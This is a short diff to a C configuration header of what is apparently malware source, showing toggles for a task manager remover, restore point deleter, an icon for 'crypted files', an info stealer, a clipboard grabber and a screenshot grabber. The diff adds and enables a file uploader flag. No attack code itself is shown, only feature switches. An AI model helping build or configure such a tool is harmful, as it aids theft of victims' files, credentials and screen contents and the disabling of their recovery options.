@@ -46,6 +46,7 @@
 #define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
+#define FILE_UPLOADER		true	// enable or disable file uploader
 #define STEAL_INFO			true	// enable or disable info stealer
 #define GET_CLIPBOARD		true	// enable or disable clipboard grabber
 #define GET_SCREENSHOT		true	// enable or disable screenshot grabber
